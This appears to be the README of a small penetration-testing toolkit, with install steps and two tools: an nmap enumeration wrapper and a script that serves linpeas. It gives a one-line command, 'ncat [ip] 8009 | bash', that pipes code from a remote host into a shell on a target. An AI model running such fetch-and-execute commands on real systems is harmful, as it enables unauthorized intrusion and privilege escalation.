# Sorcery
Quick hacks, enumeration tools and generalized bash wizardry

## Downloading Sorcery

Run the following:

``` bash
git clone http://github.com/xoanouteiro/sorcery && chmod +x ./sorcery/*
export PATH="$PATH:$(pwd)/sorcery/"
```

The last line will add sorcery to your path so you can call the tools at any time during the current session, add the line to your ~/.{shell}rc to get that effect permanently.


## fuga.sh
A 2-step nmap enumeration tool. You will first need to set your target:

``` bash
export TARGET=[IP]
```

## kairo.sh
Serve linpeas on port 8009 without downloading it persistently, on your target simply run:

``` bash
ncat [ip] 8009 | bash
```

(Change shell or ncat version as needed)
